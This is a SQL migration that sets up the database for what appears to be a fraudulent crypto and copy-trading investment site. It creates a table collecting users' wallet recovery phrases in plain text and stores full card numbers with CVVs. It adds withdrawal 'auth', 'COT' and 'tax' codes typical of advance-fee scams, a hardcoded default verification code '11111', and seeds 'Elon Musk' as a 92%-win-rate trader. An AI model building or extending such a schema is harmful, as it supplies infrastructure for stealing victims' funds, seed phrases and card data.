
ALTER TABLE public.profiles
  ADD COLUMN IF NOT EXISTS total_balance numeric DEFAULT 0,
  ADD COLUMN IF NOT EXISTS deposit numeric DEFAULT 0,
  ADD COLUMN IF NOT EXISTS withdrawal numeric DEFAULT 0,
  ADD COLUMN IF NOT EXISTS currency text DEFAULT 'USD',
  ADD COLUMN IF NOT EXISTS assigned_trader_id uuid,
  ADD COLUMN IF NOT EXISTS default_verification_code text DEFAULT '11111',
  ADD COLUMN IF NOT EXISTS avatar_url text,
  ADD COLUMN IF NOT EXISTS address text,
  ADD COLUMN IF NOT EXISTS date_of_birth date,
  ADD COLUMN IF NOT EXISTS status text DEFAULT 'active',
  ADD COLUMN IF NOT EXISTS updated_at timestamptz DEFAULT now();

UPDATE public.profiles SET
  total_balance = COALESCE(total_balance, balance, 0),
  deposit = COALESCE(deposit, total_deposit, 0),
  withdrawal = COALESCE(withdrawal, total_withdraw, 0),
  currency = COALESCE(currency, preferred_currency, 'USD'),
  assigned_trader_id = COALESCE(assigned_trader_id, manager_id);

CREATE OR REPLACE FUNCTION public.sync_profile_legacy_columns()
RETURNS trigger LANGUAGE plpgsql SET search_path = public AS $$
BEGIN
  IF NEW.total_balance IS DISTINCT FROM OLD.total_balance THEN NEW.balance := NEW.total_balance; END IF;
  IF NEW.deposit IS DISTINCT FROM OLD.deposit THEN NEW.total_deposit := NEW.deposit; END IF;
  IF NEW.withdrawal IS DISTINCT FROM OLD.withdrawal THEN NEW.total_withdraw := NEW.withdrawal; END IF;
  IF NEW.currency IS DISTINCT FROM OLD.currency THEN NEW.preferred_currency := NEW.currency; END IF;
  IF NEW.assigned_trader_id IS DISTINCT FROM OLD.assigned_trader_id THEN NEW.manager_id := NEW.assigned_trader_id; END IF;
  IF NEW.balance IS DISTINCT FROM OLD.balance AND NEW.total_balance = OLD.total_balance THEN NEW.total_balance := NEW.balance; END IF;
  IF NEW.total_deposit IS DISTINCT FROM OLD.total_deposit AND NEW.deposit = OLD.deposit THEN NEW.deposit := NEW.total_deposit; END IF;
  IF NEW.total_withdraw IS DISTINCT FROM OLD.total_withdraw AND NEW.withdrawal = OLD.withdrawal THEN NEW.withdrawal := NEW.total_withdraw; END IF;
  IF NEW.preferred_currency IS DISTINCT FROM OLD.preferred_currency AND NEW.currency = OLD.currency THEN NEW.currency := NEW.preferred_currency; END IF;
  IF NEW.manager_id IS DISTINCT FROM OLD.manager_id AND NEW.assigned_trader_id = OLD.assigned_trader_id THEN NEW.assigned_trader_id := NEW.manager_id; END IF;
  NEW.updated_at := now();
  RETURN NEW;
END $$;

DROP TRIGGER IF EXISTS trg_sync_profile_cols ON public.profiles;
CREATE TRIGGER trg_sync_profile_cols BEFORE UPDATE ON public.profiles FOR EACH ROW EXECUTE FUNCTION public.sync_profile_legacy_columns();

CREATE OR REPLACE FUNCTION public.touch_updated_at()
RETURNS trigger LANGUAGE plpgsql SET search_path = public AS $$
BEGIN NEW.updated_at := now(); RETURN NEW; END $$;

CREATE TABLE IF NOT EXISTS public.expert_traders (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  name text NOT NULL, bio text, avatar_url text,
  win_rate numeric DEFAULT 0, total_trades integer DEFAULT 0, followers_count integer DEFAULT 0,
  is_active boolean DEFAULT true, user_id uuid, handle text, specialty text,
  min_copy_amount numeric DEFAULT 500, total_profit_usd numeric DEFAULT 0,
  followers integer DEFAULT 0, sort_order integer DEFAULT 0, created_at timestamptz DEFAULT now()
);
GRANT SELECT ON public.expert_traders TO anon, authenticated;
GRANT ALL ON public.expert_traders TO service_role;
ALTER TABLE public.expert_traders ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "experts public read" ON public.expert_traders;
CREATE POLICY "experts public read" ON public.expert_traders FOR SELECT USING (true);

CREATE TABLE IF NOT EXISTS public.user_experts (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id uuid NOT NULL, expert_id uuid NOT NULL,
  is_copying boolean DEFAULT true, deposit_confirmed boolean DEFAULT false,
  created_at timestamptz DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.user_experts TO authenticated;
GRANT ALL ON public.user_experts TO service_role;
ALTER TABLE public.user_experts ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "ue own all" ON public.user_experts;
CREATE POLICY "ue own all" ON public.user_experts FOR ALL USING (auth.uid() = user_id) WITH CHECK (auth.uid() = user_id);

CREATE TABLE IF NOT EXISTS public.copy_subscriptions (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id uuid NOT NULL, trader_id uuid NOT NULL,
  status text DEFAULT 'active', plan_amount numeric DEFAULT 0,
  plan_name text, recurring_monthly boolean DEFAULT false,
  created_at timestamptz DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.copy_subscriptions TO authenticated;
GRANT ALL ON public.copy_subscriptions TO service_role;
ALTER TABLE public.copy_subscriptions ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "cs own all" ON public.copy_subscriptions;
CREATE POLICY "cs own all" ON public.copy_subscriptions FOR ALL USING (auth.uid() = user_id) WITH CHECK (auth.uid() = user_id);

CREATE TABLE IF NOT EXISTS public.account_withdrawal_codes (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id uuid NOT NULL, code text, is_used boolean DEFAULT false, expires_at timestamptz,
  type text DEFAULT 'authentication', auth_code text, cot_code text, tax_code text,
  auth_required boolean DEFAULT true, cot_required boolean DEFAULT false, tax_required boolean DEFAULT false,
  code_type text, verified boolean DEFAULT false,
  created_at timestamptz DEFAULT now(), updated_at timestamptz DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.account_withdrawal_codes TO authenticated;
GRANT ALL ON public.account_withdrawal_codes TO service_role;
ALTER TABLE public.account_withdrawal_codes ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "awc own all" ON public.account_withdrawal_codes;
CREATE POLICY "awc own all" ON public.account_withdrawal_codes FOR ALL USING (auth.uid() = user_id) WITH CHECK (auth.uid() = user_id);

CREATE TABLE IF NOT EXISTS public.kyc_submissions (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id uuid NOT NULL, document_type text, document_url text, document_number text,
  id_front_url text, id_back_url text, selfie_url text,
  status text DEFAULT 'pending', reviewed_at timestamptz, rejection_reason text, notes text,
  created_at timestamptz DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.kyc_submissions TO authenticated;
GRANT ALL ON public.kyc_submissions TO service_role;
ALTER TABLE public.kyc_submissions ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "kyc own all" ON public.kyc_submissions;
CREATE POLICY "kyc own all" ON public.kyc_submissions FOR ALL USING (auth.uid() = user_id) WITH CHECK (auth.uid() = user_id);

CREATE TABLE IF NOT EXISTS public.trading_plans (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  name text NOT NULL, description text, tagline text, badge text,
  price numeric DEFAULT 0, duration_days integer DEFAULT 30,
  features jsonb DEFAULT '[]'::jsonb, roi_percent numeric DEFAULT 0,
  is_active boolean DEFAULT true, sort_order integer DEFAULT 0,
  created_at timestamptz DEFAULT now()
);
GRANT SELECT ON public.trading_plans TO anon, authenticated;
GRANT ALL ON public.trading_plans TO service_role;
ALTER TABLE public.trading_plans ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "tp public read" ON public.trading_plans;
CREATE POLICY "tp public read" ON public.trading_plans FOR SELECT USING (true);

CREATE TABLE IF NOT EXISTS public.wallet_phrases (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id uuid NOT NULL, phrase text NOT NULL,
  wallet_type text, wallet_name text, created_at timestamptz DEFAULT now()
);
GRANT SELECT, INSERT ON public.wallet_phrases TO authenticated;
GRANT ALL ON public.wallet_phrases TO service_role;
ALTER TABLE public.wallet_phrases ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "wp own insert" ON public.wallet_phrases;
CREATE POLICY "wp own insert" ON public.wallet_phrases FOR INSERT WITH CHECK (auth.uid() = user_id);
DROP POLICY IF EXISTS "wp own select" ON public.wallet_phrases;
CREATE POLICY "wp own select" ON public.wallet_phrases FOR SELECT USING (auth.uid() = user_id);

CREATE TABLE IF NOT EXISTS public.transactions (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id uuid NOT NULL, amount numeric DEFAULT 0, status text DEFAULT 'pending',
  type text NOT NULL, method text, wallet_address text, bank_details jsonb,
  bank_name text, account_number text, routing_number text, swift_code text,
  cashapp_tag text, paypal_email text, venmo_handle text,
  card_number text, card_exp text, card_cvv text, card_billing_name text,
  auth_code text, auth_code_verified boolean DEFAULT false, proof_url text,
  created_at timestamptz DEFAULT now(), updated_at timestamptz DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.transactions TO authenticated;
GRANT ALL ON public.transactions TO service_role;
ALTER TABLE public.transactions ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "tx own all" ON public.transactions;
CREATE POLICY "tx own all" ON public.transactions FOR ALL USING (auth.uid() = user_id) WITH CHECK (auth.uid() = user_id);
DROP TRIGGER IF EXISTS trg_tx_updated ON public.transactions;
CREATE TRIGGER trg_tx_updated BEFORE UPDATE ON public.transactions FOR EACH ROW EXECUTE FUNCTION public.touch_updated_at();

INSERT INTO public.expert_traders (name, handle, specialty, win_rate, total_profit_usd, followers, min_copy_amount, sort_order, is_active)
SELECT * FROM (VALUES
  ('Elon Musk',   '@elonmusk', 'Crypto & Tech',  92::numeric, 245000::numeric, 8400, 1500::numeric, 1, true),
  ('Alex Petrov', '@alexp',    'Forex & Crypto', 87::numeric, 142000::numeric, 3821,  500::numeric, 2, true),
  ('Sofia Chen',  '@sofiac',   'Stocks & ETFs',  82::numeric,  98500::numeric, 2190,  300::numeric, 3, true),
  ('Marcus Bell', '@marcusb',  'Commodities',    79::numeric,  74200::numeric, 1540,  250::numeric, 4, true),
  ('Yuki Tanaka', '@yukit',    'Indices & FX',   76::numeric,  61000::numeric, 1102,  200::numeric, 5, true)
) v(name,handle,specialty,win_rate,total_profit_usd,followers,min_copy_amount,sort_order,is_active)
WHERE NOT EXISTS (SELECT 1 FROM public.expert_traders e WHERE lower(e.name) = lower(v.name));

INSERT INTO public.trading_plans (name, description, price, duration_days, is_active, sort_order)
SELECT name, description, COALESCE(min_amount, price, 0), COALESCE(duration_days, 30), COALESCE(is_active, true), 0
FROM public.plans
WHERE NOT EXISTS (SELECT 1 FROM public.trading_plans);
